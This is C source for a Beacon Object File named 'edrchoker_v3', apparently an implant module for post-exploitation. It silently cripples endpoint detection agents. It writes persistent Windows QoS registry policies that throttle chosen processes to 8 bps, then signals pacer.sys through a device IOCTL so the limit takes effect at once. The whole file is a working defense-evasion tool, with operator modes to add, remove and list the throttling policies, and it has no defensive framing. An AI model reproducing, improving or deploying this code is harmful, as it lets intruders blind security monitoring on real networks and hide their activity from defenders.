/*
 * edrchoker_v3.bof.c — Beacon Object File
 *
 * v3: No WMI, no COM. Pure registry + direct pacer.sys trigger.
 *
 * MECHANISM
 * ---------
 * 1. Write QoS policy to registry (v1.0 format — what pacer.sys reads):
 *      HKLM\SOFTWARE\Policies\Microsoft\Windows\QoS\<random>\
 *        Version          REG_SZ  "1.0"
 *        Application Name REG_SZ  "process.exe"
 *        Protocol         REG_SZ  "*"
 *        Local Port       REG_SZ  "*"
 *        Local IP         REG_SZ  "*"
 *        Remote Port      REG_SZ  "*"
 *        Remote IP        REG_SZ  "*"
 *        DSCP Value       REG_SZ  "-1"
 *        Throttle Rate    REG_SZ  "8"   (8 bps — effectively zero)
 *
 * 2. Send IOCTL 0x00128050 (PcpIoctlZawEvent) to \\.\PSCHED:
 *    pacer.sys re-reads its registry config and enforces immediately.
 *    No gpupdate, no reboot, no WMI needed.
 *
 * WHY v1.0 (not v2.0):
 *   v1.0 (Application Name, Throttle Rate as REG_SZ) is read by pacer.sys.
 *   v2.0 (AppName, ThrottleRate as QWORD) is read by eqos.sys — a separate
 *   driver not present on consumer Windows. Using v2.0 with pacer.sys does
 *   nothing; using v2.0 with gpupdate fails ("Enterprise QoS" error).
 *
 * WIN7 COMPATIBILITY
 *   Works on Windows 7 through Windows 11 — pacer.sys and IOCTL 0x128050
 *   (PcpIoctlZawEvent / ZAW event) have existed since NT 4.0.
 *   edrchoker_v2 (WMI MSFT_NetQosPolicySettingData) fails on Win 7 because
 *   that WMI class did not exist before Windows 8 / Server 2012.
 *   v3 has no WMI dependency and works on both.
 *
 * PERSISTENCE
 *   Policy survives reboot — registry key is NON_VOLATILE and pacer.sys
 *   reads it on driver load.
 *
 * MODES
 *   add        — write policy + trigger pacer.sys
 *   remove     — delete matching policies + trigger pacer.sys
 *   remove_all — delete all edrchoker_ policies + trigger pacer.sys
 *   list       — enumerate active edrchoker_ policies
 *
 * COMPILE AS C, NOT C++
 *   mingw64: x86_64-w64-mingw32-gcc -O2 -o edrchoker_v3.x64.o -c edrchoker_v3.bof.c -masm=intel
 *   MSVC:    cl /c /TC /GS- /Foedrchoker_v3.x64.obj edrchoker_v3.bof.c
 */

#ifdef __cplusplus
#error "Compile as C, not C++: use  gcc -c  or  cl /TC"
#endif

#include <windows.h>
#include "beacon.h"

/* ─── Dynamic imports ────────────────────────────────────────────────────── */
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegCreateKeyExW(HKEY, LPCWSTR, DWORD, LPWSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegOpenKeyExW(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegSetValueExW(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegQueryValueExW(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegDeleteKeyW(HKEY, LPCWSTR);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegEnumKeyExW(HKEY, DWORD, LPWSTR, LPDWORD, LPDWORD, LPWSTR, LPDWORD, PFILETIME);
DECLSPEC_IMPORT LONG   WINAPI ADVAPI32$RegCloseKey(HKEY);

DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetTickCount(void);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT void*  WINAPI KERNEL32$RtlMoveMemory(void*, const void*, SIZE_T);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DeviceIoControl(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);

/* ─── Constants ──────────────────────────────────────────────────────────── */
static const wchar_t g_QosBase[] =
    L"SOFTWARE\\Policies\\Microsoft\\Windows\\QoS\\";

/* IOCTL_PSCHED_ZAW_EVENT — signals pacer.sys to re-read registry policies.
 * CTL_CODE(FILE_DEVICE_NETWORK=0x12, 0x14, METHOD_BUFFERED, FILE_ANY_ACCESS) */
#define IOCTL_PSCHED_ZAW_EVENT  0x00128050

static DWORD g_randS = 0;

/* ─── String helpers ─────────────────────────────────────────────────────── */

static wchar_t* WNextTok(wchar_t** c) {
    wchar_t* s = *c;
    if (!s || !*s) return NULL;
    while (*s == L';') s++;
    if (!*s) { *c = s; return NULL; }
    wchar_t* p = s;
    while (*p && *p != L';') p++;
    if (*p == L';') { *p = L'\0'; *c = p + 1; } else { *c = p; }
    return s;
}

static int WAppend(wchar_t* dst, int pos, int max, const wchar_t* src) {
    while (*src && pos < max - 1) dst[pos++] = *src++;
    return pos;
}

static BOOL InList(const wchar_t* list, const wchar_t* needle) {
    const wchar_t* p = list;
    while (*p) {
        while (*p == L';') p++;
        if (!*p) break;
        const wchar_t* start = p;
        while (*p && *p != L';') p++;
        int segLen = (int)(p - start);
        int nLen = 0; while (needle[nLen]) nLen++;
        if (segLen == nLen) {
            int eq = 1;
            int i;
            for (i = 0; i < segLen; i++) {
                if (start[i] != needle[i]) { eq = 0; break; }
            }
            if (eq) return TRUE;
        }
    }
    return FALSE;
}

static void RandName(wchar_t* out, int n) {
    static const wchar_t pool[] =
        L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    if (!g_randS) g_randS = KERNEL32$GetTickCount() | 1;
    int i;
    for (i = 0; i < n; i++) {
        g_randS = g_randS * 1664525u + 1013904223u;
        out[i] = pool[(g_randS >> 16) % 62];
    }
    out[n] = L'\0';
}

/* ─── Registry helpers ───────────────────────────────────────────────────── */

static BOOL SetRegStr(HKEY hKey, const wchar_t* name, const wchar_t* val) {
    int len = 0; while (val[len]) len++;
    DWORD sz = (DWORD)((len + 1) * sizeof(wchar_t));
    return ADVAPI32$RegSetValueExW(hKey, name, 0, REG_SZ,
        (const BYTE*)val, sz) == ERROR_SUCCESS;
}

/* ─── pacer.sys trigger ──────────────────────────────────────────────────── */

/* Send PcpIoctlZawEvent (0x128050) to \\.\PSCHED.
 * pacer.sys re-reads HKLM\...\QoS\ and applies all policies immediately.
 * Discovered by reversing gptext.dll!ProcessPSCHEDPolicy (ordinal 3):
 * the entire Group Policy QoS CSE reduces to exactly these three calls. */
static void TriggerPsched(void) {
    HANDLE h = KERNEL32$CreateFileW(
        L"\\\\.\\PSCHED",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING,
        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (h == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [!] PSCHED open failed — Psched not running?\n");
        return;
    }
    DWORD br = 0;
    BOOL ok = KERNEL32$DeviceIoControl(
        h, IOCTL_PSCHED_ZAW_EVENT,
        NULL, 0, NULL, 0, &br, NULL);
    KERNEL32$CloseHandle(h);
    if (ok) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "  [*] pacer.sys triggered (ZAW event) — policy active now\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR,
            "  [!] ZAW IOCTL failed — policy written but not yet active\n");
    }
}

/* ─── QoS policy operations ──────────────────────────────────────────────── */

static BOOL CreateQosPolicy(const wchar_t* proc) {
    wchar_t name[9]; RandName(name, 8);

    wchar_t path[128];
    int p = WAppend(path, 0, 128, g_QosBase);
    p = WAppend(path, p, 128, name);
    path[p] = L'\0';

    HKEY hKey = NULL;
    DWORD disp;
    LONG rc = ADVAPI32$RegCreateKeyExW(
        HKEY_LOCAL_MACHINE, path, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, &disp);
    if (rc != ERROR_SUCCESS || !hKey) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [-] %S: RegCreateKeyEx failed (%ld)\n", proc, rc);
        return FALSE;
    }

    /* v1.0 format — read by pacer.sys on receiving IOCTL 0x128050.
     * v2.0 format (AppName QWORD) is for eqos.sys, not pacer.sys. */
    BOOL ok = TRUE;
    ok &= SetRegStr(hKey, L"Version",          L"1.0");
    ok &= SetRegStr(hKey, L"Application Name", proc);
    ok &= SetRegStr(hKey, L"Protocol",         L"*");
    ok &= SetRegStr(hKey, L"Local Port",       L"*");
    ok &= SetRegStr(hKey, L"Local IP",         L"*");
    ok &= SetRegStr(hKey, L"Remote Port",      L"*");
    ok &= SetRegStr(hKey, L"Remote IP",        L"*");
    ok &= SetRegStr(hKey, L"DSCP Value",       L"-1");
    ok &= SetRegStr(hKey, L"Throttle Rate",    L"8");

    ADVAPI32$RegCloseKey(hKey);

    if (ok) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [+] %S -> '%S'\n", proc, name);
    } else {
        BeaconPrintf(CALLBACK_ERROR,
            "  [-] %S: RegSetValueEx failed\n", proc);
    }
    return ok;
}

static int DeleteQosPolicies(const wchar_t* matchList) {
    HKEY hParent = NULL;
    /* KEY_SET_VALUE required: RegDeleteKeyW needs write access on the parent
     * to delete child keys (without it returns ERROR_ACCESS_DENIED). */
    LONG rc = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\QoS",
        0, KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_SET_VALUE, &hParent);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "  [-] QoS registry key not found\n");
        return 0;
    }

    const int MAX_KEYS = 64;
    const int NAME_LEN = 256;
    wchar_t* namesBuf = (wchar_t*)KERNEL32$VirtualAlloc(
        NULL, (SIZE_T)(MAX_KEYS * NAME_LEN * sizeof(wchar_t)),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!namesBuf) {
        ADVAPI32$RegCloseKey(hParent);
        return 0;
    }

    int nNames = 0;
    DWORD idx;
    for (idx = 0; nNames < MAX_KEYS; idx++) {
        DWORD subLen = NAME_LEN;
        if (ADVAPI32$RegEnumKeyExW(hParent, idx, namesBuf + nNames * NAME_LEN,
            &subLen, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
            break;
        nNames++;
    }

    int n = 0;
    int i;
    for (i = 0; i < nNames; i++) {
        wchar_t* sub = namesBuf + i * NAME_LEN;

        wchar_t appName[128];
        BOOL hasApp = FALSE;
        BOOL isMine = TRUE;
        HKEY hSub = NULL;
        if (ADVAPI32$RegOpenKeyExW(hParent, sub, 0, KEY_QUERY_VALUE, &hSub) == ERROR_SUCCESS) {
            DWORD appLen = (DWORD)sizeof(appName);
            DWORD type = 0;
            if (ADVAPI32$RegQueryValueExW(hSub, L"Application Name", NULL, &type,
                (LPBYTE)appName, &appLen) == ERROR_SUCCESS && type == REG_SZ)
                hasApp = TRUE;

            /* For remove_all: only delete policies we created (Throttle Rate = "8") */
            if (matchList == NULL) {
                wchar_t thr[16];
                DWORD thrLen = (DWORD)sizeof(thr);
                DWORD thrType = 0;
                isMine = (ADVAPI32$RegQueryValueExW(hSub, L"Throttle Rate", NULL, &thrType,
                    (LPBYTE)thr, &thrLen) == ERROR_SUCCESS &&
                    thrType == REG_SZ && thr[0] == L'8' && thr[1] == L'\0');
            }
            ADVAPI32$RegCloseKey(hSub);
        }

        if (matchList != NULL) {
            if (!hasApp || !InList(matchList, appName))
                continue;
        }

        if (matchList == NULL && !isMine) continue;

        if (ADVAPI32$RegDeleteKeyW(hParent, sub) == ERROR_SUCCESS) {
            if (hasApp) {
                BeaconPrintf(CALLBACK_OUTPUT, "  [+] restored: %S\n", appName);
            }
            n++;
        }
    }

    KERNEL32$VirtualFree(namesBuf, 0, MEM_RELEASE);
    ADVAPI32$RegCloseKey(hParent);
    return n;
}

static void ListQosPolicies(void) {
    HKEY hParent = NULL;
    LONG rc = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\QoS",
        0, KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE, &hParent);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [qos] no policies (key not found)\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[edrchoker_v3] 0 QoS policy(s)\n");
        return;
    }

    int n = 0;
    DWORD idx;
    for (idx = 0; ; idx++) {
        wchar_t sub[256];
        DWORD subLen = 256;
        if (ADVAPI32$RegEnumKeyExW(hParent, idx, sub, &subLen,
            NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
            break;

        wchar_t appName[128];
        const wchar_t* sApp = L"?";
        BOOL isMine = FALSE;
        HKEY hSub = NULL;
        if (ADVAPI32$RegOpenKeyExW(hParent, sub, 0, KEY_QUERY_VALUE, &hSub) == ERROR_SUCCESS) {
            DWORD appLen = (DWORD)sizeof(appName);
            DWORD type = 0;
            if (ADVAPI32$RegQueryValueExW(hSub, L"Application Name", NULL, &type,
                (LPBYTE)appName, &appLen) == ERROR_SUCCESS && type == REG_SZ)
                sApp = appName;

            /* Only show policies we created: Throttle Rate = "8" */
            wchar_t thr[16];
            DWORD thrLen = (DWORD)sizeof(thr);
            DWORD thrType = 0;
            if (ADVAPI32$RegQueryValueExW(hSub, L"Throttle Rate", NULL, &thrType,
                (LPBYTE)thr, &thrLen) == ERROR_SUCCESS &&
                thrType == REG_SZ && thr[0] == L'8' && thr[1] == L'\0')
                isMine = TRUE;

            ADVAPI32$RegCloseKey(hSub);
        }
        if (!isMine) continue;

        BeaconPrintf(CALLBACK_OUTPUT,
            "  [qos] %S  name='%S'\n", sApp, sub);
        n++;
    }
    ADVAPI32$RegCloseKey(hParent);

    if (n == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  [qos] no policies found\n");
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[edrchoker_v3] %d QoS policy(s)\n", n);
}

/* ─── Entry point ────────────────────────────────────────────────────────── */
void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    int   cmdN = 0;
    char* cmdA = BeaconDataExtract(&parser, &cmdN);
    int   argN = 0;
    char* argA = BeaconDataExtract(&parser, &argN);

    wchar_t cmd[32];
    int ci = 0;
    if (cmdA) {
        for (; ci < 31 && cmdA[ci]; ci++)
            cmd[ci] = (wchar_t)(unsigned char)cmdA[ci];
    }
    cmd[ci] = L'\0';

    LONG mode = 0;
    if (cmd[0] == L'r' && cmd[6] == L'\0') mode = 1;
    if (cmd[0] == L'r' && cmd[6] == L'_')  mode = 2;
    if (cmd[0] == L'l')                     mode = 3;

    const int PLEN = 2048;
    wchar_t* buf = (wchar_t*)KERNEL32$VirtualAlloc(
        NULL, (SIZE_T)PLEN * sizeof(wchar_t),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) {
        BeaconPrintf(CALLBACK_ERROR, "[-] edrchoker_v3: alloc failed\n");
        return;
    }
    if (argA && argN > 1) {
        int n = argN - 1;
        if (n >= PLEN) n = PLEN - 1;
        int i;
        for (i = 0; i < n; i++)
            buf[i] = (wchar_t)(unsigned char)argA[i];
    }

    /* ── MODE 0: write registry + trigger pacer.sys ──────────────────────── */
    if (mode == 0) {
        if (!buf[0]) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] usage: edrchoker_v3 add \"proc1.exe;proc2.exe\"\n");
            goto cleanup;
        }

        wchar_t* tb = (wchar_t*)KERNEL32$VirtualAlloc(
            NULL, (SIZE_T)PLEN * sizeof(wchar_t),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        int ok = 0, fail = 0;
        if (tb) {
            KERNEL32$RtlMoveMemory(tb, buf, (SIZE_T)(PLEN - 1) * sizeof(wchar_t));
            wchar_t* c = tb; wchar_t* tok;
            while ((tok = WNextTok(&c)) != NULL) {
                if (CreateQosPolicy(tok)) { ok++; } else { fail++; }
            }
            KERNEL32$VirtualFree(tb, 0, MEM_RELEASE);
        }
        int cbT;
        if (ok > 0) { cbT = CALLBACK_OUTPUT; } else { cbT = CALLBACK_ERROR; }
        BeaconPrintf(cbT, "[edrchoker_v3] %d policy(s) created, %d failed\n", ok, fail);
        if (ok > 0) {
            TriggerPsched();
        }

    /* ── MODE 1: remove specific ─────────────────────────────────────────── */
    } else if (mode == 1) {
        if (!buf[0]) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] usage: edrchoker_v3 remove \"proc.exe\"\n");
            goto cleanup;
        }
        int n = DeleteQosPolicies(buf);
        int cbT;
        if (n > 0) { cbT = CALLBACK_OUTPUT; } else { cbT = CALLBACK_ERROR; }
        BeaconPrintf(cbT, "[edrchoker_v3] %d policy(s) removed\n", n);
        if (n > 0) { TriggerPsched(); }

    /* ── MODE 2: remove all ──────────────────────────────────────────────── */
    } else if (mode == 2) {
        int n = DeleteQosPolicies(NULL);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[edrchoker_v3] %d QoS policy(s) removed\n", n);
        if (n > 0) { TriggerPsched(); }

    /* ── MODE 3: list ────────────────────────────────────────────────────── */
    } else {
        ListQosPolicies();
    }

cleanup:
    KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
}
